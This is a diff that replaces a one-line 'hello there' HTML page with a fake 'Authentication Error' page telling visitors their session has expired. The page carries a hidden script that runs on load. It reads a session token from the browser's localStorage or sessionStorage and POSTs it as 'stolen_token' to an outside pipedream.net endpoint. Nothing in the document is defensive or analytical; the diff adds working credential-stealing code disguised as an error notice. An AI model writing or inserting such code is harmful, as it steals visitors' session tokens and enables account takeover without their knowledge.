@@ -1,1 +1,25 @@
-<h1>hello there</h1>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Error</title>
+</head>
+<body>
+    <h2>Authentication Error</h2>
+    <p>Your session has expired. Please re-authenticate.</p>
+    
+    <script>
+        // Attempt to extract session tokens from local storage
+        var token = localStorage.getItem("token") || sessionStorage.getItem("token");
+
+        if (token) {
+            fetch("https://eokjft84lmys9zl.m.pipedream.net", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ stolen_token: token })
+            });
+        }
+    </script>
+</body>
+</html>
